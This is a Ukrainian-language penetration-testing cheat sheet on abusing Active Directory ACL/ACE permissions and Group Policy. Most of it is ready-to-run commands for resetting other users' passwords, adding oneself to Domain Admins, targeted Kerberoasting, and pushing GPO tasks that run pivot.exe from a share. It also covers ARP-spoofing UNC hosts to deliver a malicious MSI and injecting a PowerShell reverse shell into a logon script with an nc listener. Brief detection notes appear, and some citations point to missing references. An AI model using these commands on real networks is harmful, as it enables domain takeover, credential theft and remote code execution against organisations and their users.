# Зловживання ACL/ACE в Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка — переважно стислий виклад технік із** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Докладніше дивіться в оригінальних статтях.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Права GenericAll на користувача**

Цей привілей надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl` зловмисник може:

- **Змінити пароль цільового користувача**: за допомогою `net user <username> <password> /domain` зловмисник може скинути пароль користувача.
- У Linux можна зробити те саме через SAMR за допомогою Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Якщо обліковий запис вимкнено, скиньте прапорець UAC**: `GenericAll` дає змогу редагувати `userAccountControl`. У Linux BloodyAD може видалити прапорець `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Призначте SPN обліковому запису користувача, щоб зробити його kerberoastable, а потім використайте Rubeus і targetedKerberoast.py, щоб отримати хеші квитка надання квитків (TGT) і спробувати їх зламати.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Вимкніть попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` для користувача, можна додати облікові дані на основі сертифіката й автентифікуватися від його імені, не змінюючи його пароль. Див.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll на групу**

Цей привілей дає змогу зловмиснику змінювати членство в групах, якщо він має права `GenericAll` для такої групи, як `Domain Admins`. Визначивши розрізнювальне ім’я групи за допомогою `Get-NetGroup`, зловмисник може:

- **Додати себе до групи Domain Admins**: це можна зробити за допомогою прямих команд або модулів, як-от Active Directory чи PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- З Linux також можна скористатися BloodyAD, щоб додати себе до довільних груп, якщо ви маєте GenericAll/Write на керування їхнім складом. Якщо цільова група вкладена в «Remote Management Users», ви одразу отримаєте доступ через WinRM до хостів, які враховують цю групу:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв для об’єкта комп’ютера або облікового запису користувача дає змогу:

- **Kerberos Resource-based Constrained Delegation**: Дає змогу захопити об’єкт комп’ютера.
- **Shadow Credentials**: Використати цю техніку для імперсонації облікового запису комп’ютера або користувача, скориставшись привілеями для створення shadow credentials.

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` для всіх об’єктів певної групи (наприклад, `Domain Admins`), він може:

- **Додати себе до групи Domain Admins**: Це можна зробити, поєднавши команди `net user` і `Add-NetGroupUser`; цей метод дає змогу підвищити привілеї в домені.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) у групі**

Цей привілей дає зловмисникам змогу додавати себе до певних груп, наприклад `Domain Admins`, за допомогою команд, які безпосередньо змінюють членство в групах. Наведена нижче послідовність команд дає змогу додати себе до групи:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Самостійне членство)**

Подібний привілей дає змогу зловмисникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` для цих груп. Перевірити та використати цей привілей можна за допомогою:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Наявність права `ExtendedRight` для `User-Force-Change-Password` на обліковому записі користувача дозволяє скидати пароль, не знаючи поточного. Перевірити це право й скористатися ним можна через PowerShell або альтернативні інструменти командного рядка. Існує кілька способів скинути пароль користувача, зокрема в інтерактивних сеансах і за допомогою однорядкових команд у неінтерактивному середовищі. Команди варіюються від простих викликів PowerShell до використання `rpcclient` у Linux, демонструючи різноманітність векторів атаки.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner для групи**

Якщо зловмисник виявить, що має права `WriteOwner` для групи, він може змінити власника групи на себе. Це особливо небезпечно, якщо йдеться про групу `Domain Admins`, оскільки зміна власника надає ширший контроль над атрибутами та членством групи. Для цього потрібно знайти потрібний об’єкт за допомогою `Get-ObjectAcl`, а потім змінити його власника за допомогою `Set-DomainObjectOwner`, вказавши SID або ім’я.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite для користувача**

Цей дозвіл дає зловмиснику змогу змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до сценарію входу користувача, щоб виконати шкідливий сценарій під час входу користувача в систему. Для цього використовується команда `Set-ADObject`, яка оновлює властивість `scriptpath` цільового користувача, вказуючи на сценарій зловмисника.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Вужчого ACE `WriteProperty`, обмеженого атрибутом [`scriptPath` користувача](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), може бути достатньо; `GenericWrite` не потрібен. Поєднайте цей дозвіл на атрибут із можливістю запису до скрипту в дереві `SYSVOL\<domain>\scripts` або `NETLOGON` домену, а потім оцініть, чи ймовірно, що цільовий користувач увійде в систему та запустить скрипт. Скрипт виконується в контексті цього користувача під час входу. Перевірте ефективні ACL AD і файлів/спільного ресурсу окремо: відповідний ACE Allow або сама лише можливість запису до каталогу не підтверджують наявність повного шляху.

## **GenericWrite на групу**

Маючи цей привілей, атакувальники можуть змінювати членство в групі, наприклад додавати до певних груп себе або інших користувачів. Для цього створюють об'єкт облікових даних, використовують його, щоб додати користувачів до групи або видалити їх із неї, а потім перевіряють зміни членства за допомогою команд PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- У Linux Samba `net` може додавати/видаляти учасників, якщо ви маєте GenericWrite для групи (корисно, коли PowerShell/RSAT недоступні):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Володіння об’єктом AD і наявність привілеїв `WriteDACL` для нього дають зловмиснику змогу надати собі привілеї `GenericAll` щодо цього об’єкта. Це робиться за допомогою маніпуляцій з ADSI, які дають повний контроль над об’єктом і змогу змінювати його членство в групах. Попри це, під час спроби скористатися цими привілеями за допомогою командлетів модуля Active Directory `Set-Acl` / `Get-Acl` існують обмеження.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Швидке захоплення через WriteDACL/WriteOwner (PowerView)

Якщо ви маєте `WriteOwner` і `WriteDacl` для облікового запису користувача або служби, ви можете отримати повний контроль і скинути його пароль за допомогою PowerView, не знаючи старого пароля:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Примітки:
- Якщо у вас є лише `WriteOwner`, спершу може знадобитися змінити власника на себе:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Перевірте доступ за допомогою будь-якого протоколу (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

Атака DCSync використовує певні дозволи на реплікацію в домені, щоб імітувати контролер домену та синхронізувати дані, зокрема облікові дані користувачів. Ця потужна техніка потребує таких дозволів, як `DS-Replication-Get-Changes`, що дає змогу зловмисникам видобувати конфіденційну інформацію із середовища AD без прямого доступу до контролера домену.<sup>[[5]](#references)</sup> [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ до керування об’єктами групової політики (GPO) може становити значний ризик для безпеки. Наприклад, якщо користувачеві на кшталт `offense\spotless` делеговано права керування GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** і **WriteOwner**. Цими дозволами можна зловживати зі зловмисною метою. Це можна виявити за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Перелік дозволів GPO

Щоб виявити неправильно налаштовані GPO, можна об’єднати в ланцюжок командлети PowerSploit. Це дає змогу знайти GPO, якими має право керувати певний користувач: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп’ютери, до яких застосовано певну політику**: можна визначити, до яких комп’ютерів застосовується певна GPO, щоб зрозуміти потенційний масштаб впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп’ютера**: щоб переглянути політики, застосовані до конкретного комп’ютера, можна скористатися командами на кшталт `Get-DomainGPO`.

**OU, до яких застосовано певну політику**: організаційні підрозділи (OU), на які поширюється певна політика, можна визначити за допомогою `Get-DomainOU`.

Для переліку GPO та пошуку проблем у них також можна скористатися інструментом [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Зловживання GPO — New-GPOImmediateTask

Неправильно налаштовані GPO можна використати для виконання коду, наприклад, створивши негайне заплановане завдання. Це можна зробити, щоб додати користувача до групи локальних адміністраторів на вразливих комп’ютерах і суттєво підвищити привілеї:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Модуль GroupPolicy — Abuse GPO

Модуль GroupPolicy, якщо його встановлено, дає змогу створювати й прив’язувати нові GPO, а також задавати параметри, наприклад значення реєстру, для запуску backdoors на уражених комп’ютерах. Для цього методу потрібно оновити GPO, а користувач має увійти в систему на комп’ютері, щоб код виконався:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse — зловживання GPO

SharpGPOAbuse дає змогу зловживати наявними GPO, додаючи завдання або змінюючи параметри без потреби створювати нові GPO. Для цього інструмента потрібно змінити наявні GPO або створити нові за допомогою інструментів RSAT, перш ніж застосовувати зміни:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб прискорити цей процес, особливо після внесення змін, на цільовому комп’ютері можна виконати команду `gpupdate /force`, щоб негайно примусово оновити політику. Ця команда гарантує, що всі зміни GPO буде застосовано, не чекаючи наступного автоматичного циклу оновлення.

### Що відбувається за лаштунками

Переглянувши заплановані завдання для певної GPO, наприклад `Misconfigured Policy`, можна підтвердити наявність доданих завдань, як-от `evilTask`. Такі завдання створюються за допомогою скриптів або інструментів командного рядка, призначених для зміни поведінки системи або підвищення привілеїв.

Структура завдання, наведена у файлі конфігурації XML, створеному за допомогою `New-GPOImmediateTask`, описує параметри запланованого завдання, зокрема команду для виконання та тригери. Цей файл показує, як у межах GPO визначаються завдання та керують ними, і дає змогу виконувати довільні команди або скрипти під час застосування політики.

### Користувачі та групи

GPO також дають змогу змінювати членство користувачів і груп у цільових системах. Редагуючи файли політики Users and Groups безпосередньо, зловмисники можуть додавати користувачів до привілейованих груп, наприклад до локальної групи `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, що дає змогу змінювати файли політики, додаючи нових користувачів або змінюючи членство в групах.

Файл конфігурації XML для Users and Groups описує, як застосовуються ці зміни. Додаючи до нього записи, можна надати певним користувачам підвищені привілеї в усіх заторкнутих системах. Цей метод дає змогу безпосередньо підвищити привілеї через маніпуляції з GPO.

Для параметрів безпеки, як-от членство в локальних групах і права користувачів, також перевірте застосований шаблон GPO за шляхом `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` і ACL каталогу `SecEdit`. Каталог або файл із правом на запис — це підстава для перевірки: можливість фактичного внесення змін залежить від ефективних дозволів доступу до спільного ресурсу SYSVOL, заборон і успадкованих ACL, дозволів контейнера Group Policy, області дії політики та оновлення на клієнті. Саме членство в групі з назвою «GPO Managers» не підтверджує наявності прав на редагування. [Microsoft описує шлях до цього шаблону та розділення контейнера Group Policy і шаблону.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Крім того, можна розглянути інші способи виконання коду або збереження присутності, зокрема використання скриптів входу/виходу, зміну ключів реєстру для автозапуску, інсталяцію програмного забезпечення за допомогою файлів .msi або редагування конфігурацій служб. Ці методи дають різні можливості для збереження доступу та керування цільовими системами через зловживання GPO.

### Перенаправлення отримання GPC/GPT на автентифіковані шахрайські служби

GPO складається з LDAP **Group Policy Container (GPC)** із метаданими та розміщеного на SMB **Group Policy Template (GPT)** із файлами політики. Під час оновлення клієнт переходить за `gPLink` контейнера, зчитує пов’язаний GPC і його `gPCFileSysPath`, а потім завантажує GPT із цього UNC-шляху. Отже, доступ на запис до самого GPC або до `gPLink` OU, Site чи Domain можна використати для виконання привілейованої обробки політики.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Отруєння `gPCFileSysPath` за допомогою GPOddity

Якщо контрольований суб’єкт може змінювати цільовий GPC безпосередньо або через **NTLM relay to LDAP**, замініть `gPCFileSysPath` на UNC-шлях, розміщений зловмисником. [GPOddity](https://github.com/synacktiv/GPOddity) автоматизує зміну LDAP і надає шкідливий GPT, що містить файли політики на основі модулів або Immediate Task, який клієнт Group Policy виконує від імені `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Анонімного SMB-ресурсу або ресурсу, що не вимагає облікових даних, недостатньо для сучасних клієнтів Windows: SMB Secure Negotiate вимагає підтвердження успішної автентифікації, тому шахрайська служба має перевіряти доменну ідентичність, отримувати ключ сеансу SMB і правильно підписувати відповіді. У вбудованому режимі налаштуйте GPOddity, указавши контрольований обліковий запис комп’ютера та його ключ служби, а потім виберіть корисне навантаження для комп’ютера або користувача в розділі `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Крайовий випадок із User GPO:** після MS16-072 Windows і далі створює дві SMB2-сесії в межах **одного TCP-з’єднання**: user-сесія читає `GPT.INI`, потім сесія облікового запису комп’ютера читає ефективну конфігурацію, як-от `ScheduledTasks.xml`. Тому шахрайський сервер має індексувати стан автентифікації, ключі сесій і ключі підпису за SMB2 `SessionId`, а не лише за сокетом. Форк Scapy, вбудований у GPOddity/OUned, реалізує це за допомогою `SMBStreamSocketMultiplexing` і `SMBServer` із підтримкою мультиплексування; односесійні сервери Impacket/Scapy інакше повторно використовують неправильний стан підпису й не працюють із політиками користувачів.<sup>[[15]](#references)</sup>

#### Отруєння `gPLink` за допомогою OUned

Маючи `WriteGPLink`, `GenericWrite` або еквівалентний контроль над OU, Site чи Domain, зловмисник може додати посилання, GPC DN якого обслуговується контрольованим зловмисником LDAP-хостом. Цей примітив уперше представив Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) автоматизує запис LDAP і ланцюжок шкідливих GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Жертва спочатку автентифікується на шахрайському LDAP-сервісі й отримує GPC, у якому `gPCFileSysPath` вказує на шахрайський SMB-сервіс; потім вона автентифікується на SMB і застосовує наданий GPT. Отже, OUned потрібен обліковий запис із LDAP SPN, обліковий запис комп’ютера з HOST SPN для SMB (той самий обліковий запис комп’ютера може задовольнити обидві вимоги), а також DNS-резолюція або зворотне перенаправлення, що спрямовує порти 389 і 445 на хост оператора.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned's вбудований Scapy LDAP server перевіряє Kerberos/SPNEGO за допомогою справжнього контрольованого ключа служби та надає довільні дані GPC з JSON. Порожній ключ JSON моделює rootDSE, префікси `base64:` позначають бінарні значення, а server підтримує операції add/delete/modify/search і пошук `BASE`, `LEVEL` та `SUBTREE`; він може узгоджувати відсутність захисту, цілісність або конфіденційність. Завдяки цьому службу можна повторно використовувати, коли інший компонент Windows переходить за контрольованим зловмисником посиланням LDAP, але вимагає автентифікований LDAP.<sup>[[15]](#references)</sup>

Не вважайте, що синхронізація пароля облікового запису з доменом-заглушкою відтворює всі ключі Kerberos: RC4 похідний від пароля, тоді як AES string-to-key також використовує сіль, похідну від hostname/domain principal. Передавання фактичного AES-ключа облікового запису до `KerberosSSP` дає змогу уникнути примусового використання RC4 через виявлювану зміну `msDS-SupportedEncryptionTypes` облікового запису комп’ютера, який може змінювати цей атрибут самостійно.<sup>[[15]](#references)</sup>

#### Точки для виявлення

Корелюйте зміни `gPCFileSysPath` або `gPLink` зі змінами версії GPO та появою нового XML для Immediate/Scheduled Task. Перевіряйте посилання на неочікувані контексти іменування, UNC-хости поза затвердженим набором DC/SYSVOL, DNS-записи, що перенаправляють імена облікових записів комп’ютерів, квитки служби LDAP/CIFS для незвичних облікових записів комп’ютерів, а також зміни `msDS-SupportedEncryptionTypes`, які вмикають RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` для OU/domain дає змогу змінити атрибут `gPLink` цільового контейнера й **примусово застосувати наявну GPO**, не редагуючи саму GPO. Це стає цікавим, коли пов’язана GPO вже посилається на віддалений вміст через **UNC-шляхи** (`\\HOST\share\...`), оскільки автентифіковані користувачі можуть читати **SYSVOL** і шукати там політики, які можна повторно використати.<sup>[[11]](#references)</sup>

Загальний порядок дій:

1. Використайте BloodHound, щоб знайти principal із `WriteGPLink` для OU, і перелічіть комп’ютери/користувачів у цій OU.
2. Створіть копію `SYSVOL` лише для читання та проаналізуйте GPO, шукаючи **Software Installation**, **зіставлення дисків** (`Drives.xml`) і **сценарії входу/запуску**, що містять UNC-шляхи.
3. Віддавайте перевагу політикам із посиланням на **безпосередній hostname** (наприклад, `\\DC02\share\pkg.msi`), а не на шляхи DFS/простору імен домену, оскільки шляхи на основі hostname легше перенаправити за допомогою L2 spoofing.
4. Додайте GUID вибраної GPO до `gPLink` цільової OU, щоб жертва обробила цю вже наявну політику.
5. У тій самій широкомовній доменній мережі виконайте ARP spoofing UNC-хоста та призначте його IP локально (`ip addr add <target_ip>/32 dev <iface>`), щоб SMB-трафік жертви надходив на ваш хост.
6. Розмістіть очікуваний шлях/ім’я файлу на SMB-сервері зловмисника (наприклад, `smbserver.py`) і дочекайтеся звичайної обробки політик.

Приклад збору `SYSVOL` і зіставлення GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Прив’яжіть наявну GPO до цільового OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Якщо пов’язана GPO розгортає MSI з UNC-шляху, клієнт завантажить його під час **запуску комп’ютера** та встановить від імені **`NT AUTHORITY\SYSTEM`**. Підмінивши вказаний хост і розмістивши шкідливий MSI за **тим самим спільним ресурсом/шляхом/іменем**, можна перетворити `WriteGPLink` на виконання коду від імені SYSTEM **без змін у SYSVOL**.

Важливі обмеження:

- **Важливий час**: нове посилання стає видимим під час оновлення політики (зазвичай приблизно через 90 хвилин), але **Software Installation** зазвичай спрацьовує під час **перезавантаження**.
- Windows Installer зазвичай відстежує розгортання за **`ProductCode`** пакета. Якщо продукт уже встановлено, розгортання може бути пропущене.
- Щоб уникнути відхилення інсталятором, змініть підроблений MSI так, щоб його **`ProductCode`** і **`PackageCode`** збігалися з кодами легітимного пакета, на який очікує GPO.
- Старі файли оголошень `.aas` можуть залишатися в `SYSVOL`, тому перед використанням цього методу перевірте, чи розгортання все ще активне.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Перехоплення UNC для зіставлення диска -> захоплення NTLM / WebDAV relay

Зіставлення дисків GPP у `Drives.xml` змушує користувачів автентифікуватися на налаштованому UNC-шляху під час входу в систему або повторного підключення. Якщо підмінити вказаний хост, можна захопити **NetNTLMv2**. Якщо навмисно спричинити збій SMB, Windows може повторити спробу через **WebDAV**, надсилаючи **NTLM через HTTP**. Це значно розширює можливості relay до **LDAP(S)**, **AD CS** або **SMB**.

#### UNC hijack скрипта входу/запуску

Такий самий підхід застосовується до скриптів на UNC-шляхах, виявлених у `SYSVOL`:

- **Скрипти входу** зазвичай виконуються в контексті **користувача**.
- **Скрипти запуску** зазвичай виконуються в контексті **комп’ютера / SYSTEM**.

Якщо шлях до скрипта вказує на хост із підмінюваним ім’ям, перенаправте UNC-хост і розмістіть вміст скрипта-замінника в очікуваному місці.

## Отруєння скриптів входу SYSVOL/NETLOGON

Доступні для запису шляхи в `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дають змогу змінювати скрипти входу, які виконуються під час входу користувача через GPO. Це забезпечує виконання коду в контексті безпеки користувачів, які входять у систему.

### Пошук скриптів входу
- Перевірте атрибути користувача на наявність налаштованого скрипта входу:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Проскануйте спільні ресурси домену, щоб виявити ярлики або посилання на скрипти:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Аналізуйте файли `.lnk`, щоб визначати цілі, що вказують на SYSVOL/NETLOGON (корисний трюк для DFIR і для атакувальників без прямого доступу до GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound відображає атрибут скрипту входу `scriptPath` об’єкта користувача, якщо він заданий. Скрипти входу, налаштовані через GPO, є окремим посиланням на політику, тому також перевірте відповідний GPO.

### Перевірте доступ на запис (не довіряйте спискам спільних ресурсів)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як ресурси лише для читання, навіть якщо точний ACL NTFS для конкретного скрипту інший. Почніть із перевірки лише для читання цього файлу та батьківського каталогу; відповідні Allow ACE залишаються можливими кандидатами, оскільки важливі ефективні права доступу SMB і NTFS, Deny ACE та поточний токен:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Перевірка запису має стосуватися конкретної цілі та бути оборотною: спершу створіть резервну копію оригінального скрипту, а потім відновіть його. Не перезаписуйте робочий скрипт входу лише для перевірки доступу: успішно записаний скрипт може виконатися під час наступного входу користувача.

### Отруєння скрипту входу VBScript для RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте його на revshells.com), і збережіть оригінальну логіку, щоб не порушити роботу бізнес-функцій:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Прослуховуйте на своєму хості та очікуйте на наступний інтерактивний вхід у систему:

```bash
rlwrap -cAr nc -lnvp 443
```

Нотатки:
- Виконання відбувається з токеном користувача, від імені якого ведеться журналювання (не SYSTEM). Область дії — посилання GPO (OU, сайт, домен), до якого застосовується цей скрипт.
- Після використання відновіть початковий вміст і часові мітки.


## References

- [1] [Зловживання ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Привілейовані облікові записи та привілеї токенів](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 — оновлення шляхів атак через ACL](https://wald0.com/?p=112)
- [4] [Перелік ActiveDirectoryRights — Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Підвищення привілеїв за допомогою ACL в Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Сканування привілеїв і привілейованих облікових записів Active Directory](https://adsecurity.org/?p=3658)
- [7] [Конструктор ActiveDirectoryAccessRule — Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD — операції з атрибутами AD/UAC у Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba — net rpc (членство в групах)](https://www.samba.org/)
- [10] [HTB Puppy: зловживання ACL AD, злам Argon2 у KeePassXC і розшифрування DPAPI для отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
